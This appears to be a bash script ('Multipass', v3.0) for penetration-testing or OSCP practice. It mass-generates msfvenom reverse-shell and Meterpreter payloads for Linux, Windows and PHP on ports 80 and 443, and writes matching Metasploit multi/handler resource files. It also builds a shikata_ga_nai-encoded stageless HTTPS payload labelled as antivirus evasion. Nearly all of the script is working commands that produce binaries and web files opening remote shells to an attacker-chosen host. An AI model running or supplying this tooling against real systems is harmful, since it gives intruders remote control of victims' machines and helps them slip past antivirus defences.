#!/bin/bash
echo " __  __ _   _ _   _____ ___ ____   _    ____ ____"  
echo "|  \/  | | | | | |_   _|_ _|  _ \ / \  / ___/ ___|" 
echo "| |\/| | | | | |   | |  | || |_) / _ \ \___ \___ \ "
echo "| |  | | |_| | |___| |  | ||  __/ ___ \ ___) |__) |"
echo "|_|  |_|\___/|_____|_| |___|_| /_/   \_\____/____/"
echo ""
echo "Usage: Multipass KaliboxIP"
echo "Alternative use Multipass eth0 or tap0"
echo "Use msfconsole -r NAMEOFTHEPAYLOAD.rc to set up the handler for the payload"
echo "---------------------------------------------------------------------------------"

echo "Thx Unfo for the original Idea"
echo "Thx for the discord crowd for the kick to do it in a propper way"

echo "---------------------------------------------------------------------------------"
echo " Version 3.0 Date: 19.06.2018"
echo "Changes: basic AV evasion, and handler setup scripts"
echo "---------------------------------------------------------------------------------"
echo "mp payloads = METERPRETER = UNSAFE for the OSCP Exam .. just saying"
echo "ave payloads = tend to work against basic AV and Firewalls. For better payloads we need veil evasion framework. For that there will be a extra version of multipass soon (TM) " 
mkdir ./$@
mkdir ./$@/linux
mkdir ./$@/windows
mkdir ./$@/php

echo "###################### Reverse TCP  MP Linux Port 80 and 443 #################"
msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f elf -o ./$@/linux/linux_x86_mp_rev_tcp_p443.elf


msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/linux/linux_x86_mp_rev_tcp_p443.c


msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f elf -o ./$@/linux/linux_x86_mp_rev_tcp_p80.elf


msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/linux/linux_x86_mp_rev_tcp_p80.c
#RC File for MP 443 and Port 80
#Port 443
touch ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
echo set PAYLOAD linux/x86/meterpreter/reverse_tcp  >> ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/linux/linux_x86_mp_rev_tcp_p443.rc
#Port 80
touch ./$@/linux/linux_x86_mp_rev_tcp_p80.rc
echo use exploit/multi/handler >> ./$@/linux/linux_x86_mp_rev_tcp_p80.rc
echo set PAYLOAD linux/x86/meterpreter/reverse_tcp  >> ./$@/linux/linux_x86_mp_rev_tcp_p80.rc
echo set LHOST $@ >> ./$@/linux/linux_x86_mp_rev_tcp_p80.rc
echo set LPORT 80 >> ./$@/linux/linux_x86_mp_rev_tcp_p80.rc
echo set ExitOnSession false >> ./$@/linux/linux_x86_mp_rev_tcp_p80.rc
echo exploit -j -z >> ./$@/linux/linux_x86_mp_rev_tcp_p80.rc

echo "###################### Reverse Shell Linux X86 Port 80 and 443 #################"
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=443 -f elf -o ./$@/linux/linux_X86_shell_rev_tcp_p443.elf
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/linux/linux_X86_shell_rev_tcp_p443.c

msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=80 -f elf -o ./$@/linux/linux_X86_shell_rev_tcp_p80.elf
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/linux/linux_X86_shell_rev_tcp_p80.c

#RC File for Shell 443 and Port 80
#Port 80
touch ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
echo use exploit/multi/handler >> ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
echo set PAYLOAD linux/x86/shell_reverse_tcp  >> ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
echo set LHOST $@ >> ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
echo set LPORT 80 >> ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
echo set ExitOnSession false >> ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
echo exploit -j -z >> ./$@/linux/linux_X86_shell_rev_tcp_p80.rc
#Port 443
touch ./$@/linux/linux_X86_shell_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/linux/linux_X86_shell_rev_tcp_p443.rc
echo set PAYLOAD linux/x86/shell_reverse_tcp  >> ./$@/linux/linux_X86_shell_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/linux/linux_X86_shell_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/linux/linux_X86_shell_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/linux/linux_X86_shell_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/linux/linux_X86_shell_rev_tcp_p443.rc

echo "###################### Reverse MP Windows x86 Port 80 and 443 #################"
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f exe -o ./$@/windows/win_X86_mp_rev_tcp_p443.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/windows/win_X86_mp_rev_tcp_p443.c

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f exe -o ./$@/windows/win_X86_mp_rev_tcp_p80.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/windows/win_X86_mp_rev_tcp_p80.c

#RC File for Shell 443 and Port 80
#Port 443
touch ./$@/windows/win_X86_mp_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/windows/win_X86_mp_rev_tcp_p443.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> ./$@/windows/win_X86_mp_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/windows/win_X86_mp_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/windows/win_X86_mp_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/windows/win_X86_mp_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/windows/win_X86_mp_rev_tcp_p443.rc
#Port 80
touch ./$@/windows/win_X86_mp_rev_tcp_p80.rc
echo use exploit/multi/handler >> ./$@/windows/win_X86_mp_rev_tcp_p80.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> ./$@/windows/win_X86_mp_rev_tcp_p80.rc
echo set LHOST $@ >> ./$@/windows/win_X86_mp_rev_tcp_p80.rc
echo set LPORT 80 >> ./$@/windows/win_X86_mp_rev_tcp_p80.rc
echo set ExitOnSession false >> ./$@/windows/win_X86_mp_rev_tcp_p80.rc
echo exploit -j -z >> ./$@/windows/win_X86_mp_rev_tcp_p80.rc

echo "###################### Reverse x86 Shell Windows Port 80 and 443 #################"
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=443 -f exe -o ./$@/windows/win_X86_shell_rev_tcp_p443.exe
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=443 -f c -o ./$@/windows/win_X86_shell_rev_tcp_p443.c

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=80 -f exe -o ./$@/windows/win_X86_shell_rev_tcp_p80.exe
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$@ LPORT=80 -f c -o ./$@/windows/win_X86_shell_rev_tcp_p80.c

#RC File for Shell 443 and Port 80
#Port 443
touch ./$@/windows/win_X86_shell_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/windows/win_X86_shell_rev_tcp_p443.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> ./$@/windows/win_X86_shell_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/windows/win_X86_shell_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/windows/win_X86_shell_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/windows/win_X86_shell_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/windows/win_X86_shell_rev_tcp_p443.rc
#Port 80
touch ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo use exploit/multi/handler >> ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo set LHOST $@ >> ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo set LPORT 80 >> ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo set ExitOnSession false >> ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo exploit -j -z >> ./$@/windows/win_X86_shell_rev_tcp_p80.rc
echo "###################### Reverse PHP MP Port 80 and 443 #################"
echo "<?php" > ./$@/php/php_mp_rev_tcp_p80.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=$@ LPORT=80 -f raw >> ./$@/php/php_mp_rev_tcp_p80.php 
echo "?>" >> ./$@/php/php_mp_rev_tcp_p80.php

echo "<?php" > ./$@/php/php_mp_rev_tcp_p443.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=$@ LPORT=443 -f raw >> ./$@/php/php_mp_rev_tcp_p443.php 
echo "?>" >> ./$@/php/php_mp_rev_tcp_p443.php
#RC File for Shell 443 and Port 80
#Port 443
touch ./$@/php/php_mp_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/php/php_mp_rev_tcp_p443.rc
echo set PAYLOAD php/meterpreter_reverse_tcp >> ./$@/php/php_mp_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/php/php_mp_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/php/php_mp_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/php/php_mp_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/php/php_mp_rev_tcp_p443.rc
#Port 80
touch ./$@/php/php_mp_rev_tcp_p80.rc
echo use exploit/multi/handler >> ./$@/php/php_mp_rev_tcp_p80.rc
echo set PAYLOAD php/meterpreter_reverse_tcp >> ./$@/php/php_mp_rev_tcp_p80.rc
echo set LHOST $@ >> ./$@/php/php_mp_rev_tcp_p80.rc
echo set LPORT 80 >> ./$@/php/php_mp_rev_tcp_p80.rc
echo set ExitOnSession false >> ./$@/php/php_mp_rev_tcp_p80.rc
echo exploit -j -z >> ./$@/php/php_mp_rev_tcp_p80.rc
echo "###################### Reverse PHP  Shell Port 80 and 443 #################"
echo "<?php" > ./$@/php/php_rev_tcp_p80.php
msfvenom -p php/reverse_php LHOST=$@ LPORT=80 -f raw >> ./$@/php/php_rev_tcp_p80.php
echo "?>" >> ./$@/php/php_rev_tcp_p80.php



echo "<?php" > ./$@/php/php_rev_tcp_p443.php
msfvenom -p php/reverse_php LHOST=$@ LPORT=443 -f raw >> ./$@/php/php_rev_tcp_p443.php
echo "?>" >> ./$@/php/php_rev_tcp_p443.php

#RC File for Shell 443 and Port 80
#Port 443
touch ./$@/php/php_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/php/php_rev_tcp_p443.rc
echo set PAYLOAD php/reverse_php  >> ./$@/php/php_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/php/php_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/php/php_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/php/php_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/php/php_rev_tcp_p443.rc
#Port 80
touch ./$@/php/php_rev_tcp_p80.rc
echo use exploit/multi/handler >> ./$@/php/php_rev_tcp_p80.rc
echo set PAYLOAD php/reverse_php  >> ./$@/php/php_rev_tcp_p80.rc
echo set LHOST $@ >> ./$@/php/php_rev_tcp_p80.rc
echo set LPORT 80 >> ./$@/php/php_rev_tcp_p80.rc
echo set ExitOnSession false >> ./$@/php/php_rev_tcp_p80.rc
echo exploit -j -z >> ./$@/php/php_rev_tcp_p80.rc
echo "//////////////////////////AV EVASION PAYLOADS ETC \\\\\\\\\\\\\\\\\\\\\\\\"
msfvenom -a x86 --platform windows -a x64 -p windows/x64/meterpreter_reverse_https  --encoder  x86/shikata_ga_nai LHOST=$@ LPORT=443 -f exe -o ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.exe

msfvenom -a x86 --platform windows -a x64 -p windows/x64/meterpreter_reverse_https --encoder  x86/shikata_ga_nai  LHOST=$@ LPORT=443 -f c -o ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.c

#RC File for Shell 443 
#Port 443
touch ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
echo use exploit/multi/handler >> ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
echo set PAYLOAD windows/x64/meterpreter_reverse_https >> ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
echo set LHOST $@ >> ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
echo set LPORT 443 >> ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
echo set ExitOnSession false >> ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
echo exploit -j -z >> ./$@/windows/win_x64_mp_stageless_AVE_rev_tcp_p443.rc
